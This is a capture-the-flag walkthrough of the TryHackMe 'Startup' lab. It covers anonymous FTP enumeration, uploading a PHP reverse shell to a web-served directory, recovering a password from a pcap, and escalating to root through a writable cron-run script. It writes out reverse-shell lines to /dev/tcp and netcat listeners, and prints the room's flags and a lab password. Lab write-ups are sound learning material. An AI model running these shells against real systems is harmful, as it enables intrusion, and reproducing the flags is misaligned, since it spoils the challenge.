- - - 
created : 29-07-2025 

Tags : #easy 
- - - 
# Objective

**We are Spice Hut,** a new startup company that just made it big! We offer a variety of spices and club sandwiches (in case you get hungry), but that is not why you are here. To be truthful, we aren't sure if our developers know what they are doing and our security concerns are rising. We ask that you perform a thorough penetration test and try to own root. Good luck!
# Recon
## Rustscan - Nmap

First we add the target IP to our /etc/hosts file, then we use [Rustscan](../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) that will pass the result to [Nmap](../../3%20-%20Tags/Hacking%20Tools/Nmap.md) :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Easy/Startup]
└─$ rustscan -a startup.thm -- -A  

Open 10.10.239.22:21
Open 10.10.239.22:22
Open 10.10.239.22:80

PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.8.162.183
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt

22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)

80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Maintenance
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS

Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.4
OS details: Linux 4.4

```
# Enumeration
## FTP (80)

We have anonymous access and nmap scan showed us some files so let's download them :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Easy/Startup]
└─$ ftp anonymous@startup.thm
Connected to startup.thm.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||59083|)
150 Here comes the directory listing.
drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp
-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
226 Directory send OK.
ftp> get important.jpg
local: important.jpg remote: important.jpg
229 Entering Extended Passive Mode (|||29345|)
150 Opening BINARY mode data connection for important.jpg (251631 bytes).
100% |*************************************************|   245 KiB  199.60 KiB/s    00:00 ETA
226 Transfer complete.
251631 bytes received in 00:01 (160.12 KiB/s)
ftp> get notice.txt
local: notice.txt remote: notice.txt
229 Entering Extended Passive Mode (|||54434|)
150 Opening BINARY mode data connection for notice.txt (208 bytes).
100% |*************************************************|   208        2.10 MiB/s    00:00 ETA
226 Transfer complete.
208 bytes received in 00:00 (0.66 KiB/s)

┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Easy/Startup]
└─$ cat notice.txt 
Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus.
```

Seems we have a username: `maya` .

Also we want to check if we can write in the directory and other hidden files :

```bash
ftp> ls -la
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
drwxr-xr-x    3 65534    65534        4096 Nov 12  2020 .
drwxr-xr-x    3 65534    65534        4096 Nov 12  2020 ..
-rw-r--r--    1 0        0               5 Nov 12  2020 .test.log
drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp
-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt

ftp> cd ftp

ftp> ls -la
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 .
drwxr-xr-x    3 65534    65534        4096 Nov 12  2020 ..
```

So in this directory we can write and execute files..strange.
## HTTP (80)

Let's see the main page :

![Pasted image 20250729205436.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250729205436.png)
### Gobuster

We can use [Gobuster](../../3%20-%20Tags/Hacking%20Tools/Gobuster.md) tu start [Enumeration](../../3%20-%20Tags/Hacking%20Concepts/Enumeration.md) on the target :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Easy/Startup]
└─$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt  -u http://startup.thm

/.htpasswd            (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/files                (Status: 301) [Size: 310] [--> http://startup.thm/files/]
/server-status        (Status: 403) [Size: 276]
```

/files is where we find the [FTP](../../3%20-%20Tags/Hacking%20Concepts/FTP.md) files, we already have them.
# Exploit

We try to copy a shell with the [FTP](../../3%20-%20Tags/Hacking%20Concepts/FTP.md) protocol, we'll use pentestmonkey php [Reverse Shell](../../3%20-%20Tags/Hacking%20Concepts/Reverse%20Shell.md), you can find it here https://github.com/pentestmonkey/php-reverse-shell, make sure to change IP and port in the code and save it then we copy that : 

```bash
ftp> put php-reverse-shell.php 
local: php-reverse-shell.php remote: php-reverse-shell.php
200 EPRT command successful. Consider using EPSV.
150 Ok to send data.
100% |**************************************************|  5494       31.00 MiB/s    00:00 ETA
226 Transfer complete.
5494 bytes sent in 00:00 (17.47 KiB/s)
```

Now we have to trigger that, let's try in the browser to go to the directory :

![Pasted image 20250729214117.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250729214117.png)

There it is, let's try to open our listener with [Netcat](../../3%20-%20Tags/Hacking%20Tools/Netcat.md) and click on that :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Easy/Startup]
└─$ nc -lvnp 1337 
listening on [any] 1337 ...
connect to [10.8.162.183] from (UNKNOWN) [10.10.239.22] 43812
Linux startup 4.4.0-190-generic #220-Ubuntu SMP Fri Aug 28 23:02:15 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 19:42:17 up 56 min,  0 users,  load average: 0.00, 0.02, 0.04
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

We can see the **secret recipe** :

```
$ cat recipe.txt
Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was love.
```
## Shell Stabilization

Time to perform [Shell Stabilization](../../3%20-%20Tags/Hacking%20Concepts/Shell%20Stabilization.md) :

```bash
$ export TERM=xterm
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@startup:/$ ^Z
zsh: suspended  nc -lvnp 1337                                                                                             
┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Easy/Startup]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvnp 1337
                             reset
www-data@startup:/$ 
```
# Lateral Movement - Privilege Escalation
## www-data to Lennie

We start [Privilege Escalation](../../3%20-%20Tags/Hacking%20Concepts/Privilege%20Escalation.md) checking the suspicious.pcap file, so we download it with [Netcat](../../3%20-%20Tags/Hacking%20Tools/Netcat.md) (I wasn't able to open a python server) we open another listener :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Easy/Startup]
└─$ nc -lvnp 4444 > suspicious.pcapng   

listening on [any] 4444 ...

```

Now from the target we send the file :

```bash
www-data@startup:/incidents$ nc 10.8.162.183 4444 < suspicious.pcapng
```

### WireShark

We can open the file, if we search through TCP strings we find something :

![Pasted image 20250730112813.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250730112813.png)

Let's try to switch user with this password : **c4ntg3t3n0ughsp1c3**

```
www-data@startup:/incidents$ su lennie
Password: 
lennie@startup:/incidents$ cd --
lennie@startup:~$ cat 
Documents/ scripts/   user.txt   
lennie@startup:~$ cat user.txt 
THM{03ce3d619b80ccbfb3b7fc81e46c0e79}
```

And we have the **user flag**.
## Lennie to Root

First we check for sudo permissions :

```
sudo: unable to resolve host startup                                                                        
[sudo] password for lennie:                                                                                 
Sorry, user lennie may not run sudo on startup.           
```

Then we check for strange SUID files, to search the a system for these type of files run the following: `find / -perm -u=s -type f 2>/dev/null` :

```
lennie@startup:~$ find / -perm -u=s -type f 2>/dev/null                                                     
/bin/mount                                                                                                  
/bin/fusermount                                                                                             
/bin/umount                                                                                                 
/bin/ping6
/bin/su
/bin/ping
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/at
/usr/bin/sudo
/usr/bin/newuidmap
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/newgidmap
/usr/bin/gpasswd
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
```

We are not in the sudoers file so nothing we can really use there.

If we check in lennie's home we find some scripts :

```
lennie@startup:~/scripts$ cat 
planner.sh        startup_list.txt  
lennie@startup:~/scripts$ cat planner.sh 
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
lennie@startup:~/scripts$ cat startup_list.txt 

```

We have planner.sh, let's see if we can write to that and who's the owner :

```
ennie@startup:~/scripts$ ls -la
total 16
drwxr-xr-x 2 root   root   4096 Nov 12  2020 .
drwx------ 4 lennie lennie 4096 Nov 12  2020 ..
-rwxr-xr-x 1 root   root     77 Nov 12  2020 planner.sh
-rw-r--r-- 1 root   root      1 Jul 30 09:49 startup_list.txt
```

And we can't write but execute it, it will run as root (owner), so let's check if we can write on print.sh :

```bash
lennie@startup:/etc$ ls -la
total 844
drwxr-xr-x 96 root   root    4096 Nov 12  2020 .
drwxr-xr-x 25 root   root    4096 Jul 30 10:57 ..
drwxr-xr-x  3 root   root    4096 Sep 25  2020 acpi
-rw-r--r--  1 root   root    3028 Sep 25  2020 adduser.conf
drwxr-xr-x  2 root   root    4096 Nov 12  2020 alternatives
drwxr-xr-x  3 root   root    4096 Nov 12  2020 amazon
drwxr-xr-x  8 root   root    4096 Nov 12  2020 apache2
drwxr-xr-x  3 root   root    4096 Sep 25  2020 apm
drwxr-xr-x  3 root   root    4096 Sep 25  2020 apparmor
drwxr-xr-x  9 root   root    4096 Sep 25  2020 apparmor.d
drwxr-xr-x  3 root   root    4096 Sep 25  2020 apport
drwxr-xr-x  7 root   root    4096 Sep 25  2020 apt
-rw-r-----  1 root   daemon   144 Jan 14  2016 at.deny
-rw-r--r--  1 root   root    2188 Aug 31  2015 bash.bashrc
-rw-r--r--  1 root   root      45 Aug 12  2015 bash_completion
drwxr-xr-x  2 root   root    4096 Sep 25  2020 bash_completion.d
-rw-r--r--  1 root   root     367 Jan 27  2016 bindresvport.blacklist
drwxr-xr-x  2 root   root    4096 Apr 12  2016 binfmt.d
drwxr-xr-x  2 root   root    4096 Sep 25  2020 byobu
drwxr-xr-x  3 root   root    4096 Sep 25  2020 ca-certificates
-rw-r--r--  1 root   root    5678 Sep 25  2020 ca-certificates.conf
drwxr-xr-x  2 root   root    4096 Sep 25  2020 calendar
drwxr-xr-x  4 root   root    4096 Sep 25  2020 cloud
drwxr-xr-x  2 root   root    4096 Sep 25  2020 console-setup
drwxr-xr-x  2 root   root    4096 Nov 12  2020 cron.d
drwxr-xr-x  2 root   root    4096 Nov 12  2020 cron.daily
drwxr-xr-x  2 root   root    4096 Sep 25  2020 cron.hourly
drwxr-xr-x  2 root   root    4096 Sep 25  2020 cron.monthly
-rw-r--r--  1 root   root     722 Apr  5  2016 crontab
drwxr-xr-x  2 root   root    4096 Sep 25  2020 cron.weekly
-rw-r--r--  1 root   root      54 Sep 25  2020 crypttab
drwxr-xr-x  4 root   root    4096 Sep 25  2020 dbus-1
-rw-r--r--  1 root   root    2969 Nov 10  2015 debconf.conf
-rw-r--r--  1 root   root      12 Apr 30  2015 debian_version
drwxr-xr-x  3 root   root    4096 Nov 12  2020 default
-rw-r--r--  1 root   root     604 Jul  2  2015 deluser.conf
drwxr-xr-x  2 root   root    4096 Sep 25  2020 depmod.d
drwxr-xr-x  4 root   root    4096 Sep 25  2020 dhcp
drwxr-xr-x  4 root   root    4096 Sep 25  2020 dpkg
-rw-r--r--  1 root   root      34 Sep 25  2020 ec2_version
-rw-r--r--  1 root   root      96 Sep 25  2020 environment
drwxr-xr-x  4 root   root    4096 Sep 25  2020 fonts
-rw-r--r--  1 root   root      42 Nov 12  2020 fstab
-rw-r--r--  1 root   root      43 Sep 25  2020 fstab.orig
-rw-r--r--  1 root   root     132 Feb 10  2016 ftpusers
-rw-r--r--  1 root   root     280 Jun 20  2014 fuse.conf
-rw-r--r--  1 root   root    2584 Feb 18  2016 gai.conf
drwxr-xr-x  2 root   root    4096 Sep 25  2020 groff
-rw-r--r--  1 root   root     800 Nov 12  2020 group
-rw-------  1 root   root     782 Nov 12  2020 group-
drwxr-xr-x  2 root   root    4096 Sep 25  2020 grub.d
-rw-r-----  1 root   shadow   662 Nov 12  2020 gshadow
-rw-------  1 root   root     648 Nov 12  2020 gshadow-
drwxr-xr-x  3 root   root    4096 Sep 25  2020 gss
-rw-r--r--  1 root   root    4781 Mar 17  2016 hdparm.conf
-rw-r--r--  1 root   root      92 Oct 22  2015 host.conf
-rw-r--r--  1 root   root       8 Nov 12  2020 hostname
-rw-r--r--  1 root   root     260 Nov 12  2020 hosts
-rw-r--r--  1 root   root     411 Sep 25  2020 hosts.allow
-rw-r--r--  1 root   root     711 Sep 25  2020 hosts.deny
drwxr-xr-x  2 root   root    4096 Nov 12  2020 init
drwxr-xr-x  2 root   root    4096 Nov 12  2020 init.d
drwxr-xr-x  5 root   root    4096 Sep 25  2020 initramfs-tools
-rw-r--r--  1 root   root    1748 Feb  4  2016 inputrc
drwxr-xr-x  3 root   root    4096 Mar  6  2015 insserv
-rw-r--r--  1 root   root     771 Mar  6  2015 insserv.conf
drwxr-xr-x  2 root   root    4096 Mar  6  2015 insserv.conf.d
drwxr-xr-x  2 root   root    4096 Sep 25  2020 iproute2
drwxr-xr-x  2 root   root    4096 Sep 25  2020 iscsi
-rw-r--r--  1 root   root      26 Aug 17  2020 issue
-rw-r--r--  1 root   root      19 Aug 17  2020 issue.net
drwxr-xr-x  2 root   root    4096 Sep 25  2020 kbd
drwxr-xr-x  4 root   root    4096 Sep 25  2020 kernel
-rw-r--r--  1 root   root     110 Sep 25  2020 kernel-img.conf
drwxr-xr-x  2 root   root    4096 Sep 25  2020 ldap
-rw-r--r--  1 root   root   21498 Nov 12  2020 ld.so.cache
-rw-r--r--  1 root   root      34 Jan 27  2016 ld.so.conf
drwxr-xr-x  2 root   root    4096 Sep 25  2020 ld.so.conf.d
-rw-r--r--  1 root   root     267 Oct 22  2015 legal
-rw-r--r--  1 root   root     191 Jan 18  2016 libaudit.conf
-rw-r--r--  1 root   root    2995 Apr 14  2016 locale.alias
-rw-r--r--  1 root   root    9151 Nov 12  2020 locale.gen
lrwxrwxrwx  1 root   root      27 Sep 25  2020 localtime -> /usr/share/zoneinfo/Etc/UTC
drwxr-xr-x  4 root   root    4096 Sep 25  2020 logcheck
-rw-r--r--  1 root   root   10551 Mar 29  2016 login.defs
-rw-r--r--  1 root   root     703 May  6  2015 logrotate.conf
drwxr-xr-x  2 root   root    4096 Nov 12  2020 logrotate.d
-rw-r--r--  1 root   root     105 Aug 17  2020 lsb-release
-rw-r--r--  1 root   root   14867 Apr 12  2016 ltrace.conf
drwxr-xr-x  2 root   root    4096 Sep 25  2020 lvm
-r--r--r--  1 root   root      33 Nov 12  2020 machine-id
-rw-r--r--  1 root   root     111 Nov 20  2015 magic
-rw-r--r--  1 root   root     111 Nov 20  2015 magic.mime
-rw-r--r--  1 root   root    3623 Nov 12  2020 mailcap
-rw-r--r--  1 root   root     449 Oct 30  2015 mailcap.order
-rw-r--r--  1 root   root    5170 Nov  6  2015 manpath.config
drwxr-xr-x  2 root   root    4096 Sep 25  2020 mdadm
-rw-r--r--  1 root   root   24241 Oct 30  2015 mime.types
-rw-r--r--  1 root   root     967 Oct 30  2015 mke2fs.conf
drwxr-xr-x  2 root   root    4096 Sep 25  2020 modprobe.d
-rw-r--r--  1 root   root     195 Sep 25  2020 modules
drwxr-xr-x  2 root   root    4096 Sep 25  2020 modules-load.d
lrwxrwxrwx  1 root   root      19 Sep 25  2020 mtab -> ../proc/self/mounts
-rw-r--r--  1 root   root    8338 Feb 15  2017 nanorc
drwxr-xr-x  7 root   root    4096 Nov 12  2020 network
drwxr-xr-x  3 root   root    4096 Sep 25  2020 NetworkManager
-rw-r--r--  1 root   root      91 Oct 22  2015 networks
drwxr-xr-x  2 root   root    4096 Sep 25  2020 newt
-rw-r--r--  1 root   root     497 May  4  2014 nsswitch.conf
drwxr-xr-x  2 root   root    4096 Sep 25  2020 opt
lrwxrwxrwx  1 root   root      21 Aug 17  2020 os-release -> ../usr/lib/os-release
-rw-r--r--  1 root   root    6920 Oct  1  2018 overlayroot.conf
-rw-r--r--  1 root   root     112 Sep 25  2020 overlayroot.local.conf
-rw-r--r--  1 root   root     552 Mar 16  2016 pam.conf
drwxr-xr-x  2 root   root    4096 Nov 12  2020 pam.d
-rw-r--r--  1 root   root    1736 Nov 12  2020 passwd
-rw-------  1 root   root    1696 Nov 12  2020 passwd-
drwxr-xr-x  4 root   root    4096 Sep 25  2020 perl
drwxr-xr-x  3 root   root    4096 Nov 12  2020 php
drwxr-xr-x  3 root   root    4096 Sep 25  2020 pm
drwxr-xr-x  5 root   root    4096 Sep 25  2020 polkit-1
drwxr-xr-x  2 root   root    4096 Sep 25  2020 pollinate
-rw-r--r--  1 root   root       0 Sep 25  2020 popularity-contest.conf
drwxr-xr-x  4 root   root    4096 Sep 25  2020 ppp
-rwx------  1 lennie lennie    25 Nov 12  2020 print.sh
...
```

Seems there's some cronjob running, let's check :

```bash
lennie@startup:/$ cat /etc/crontab
cat /etc/crontab                                                                                                
# /etc/crontab: system-wide crontab                                                                             
# Unlike any other crontab you don't have to run the `crontab'                                                  
# command to install the new version when you edit this file                                                    
# and files in /etc/cron.d. These files also have username fields,                                              
# that none of the other crontabs do.                                                                                
SHELL=/bin/sh                                                                                                   
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
```

Yes we can, let's try to put a [Reverse Shell](../../3%20-%20Tags/Hacking%20Concepts/Reverse%20Shell.md) in there :

```bash
lennie@startup:/etc$ cat print.sh 
#!/bin/bash
echo "Done!"
bash -c 'exec bash -i &>/dev/tcp/10.8.162.183/4444 <&1'
```

Now we open our [Netcat](../../3%20-%20Tags/Hacking%20Tools/Netcat.md) listener, then wait for the cronjob to be executed automatically :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Easy/Startup]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.8.162.183] from (UNKNOWN) [10.10.68.10] 33218
bash: cannot set terminal process group (1595): Inappropriate ioctl for device
bash: no job control in this shell
root@startup:~# cat /root/root.txt
cat /root/root.txt
THM{f963aaa6a430f210222158ae15c3d76d}
```

And we have the **root flag**.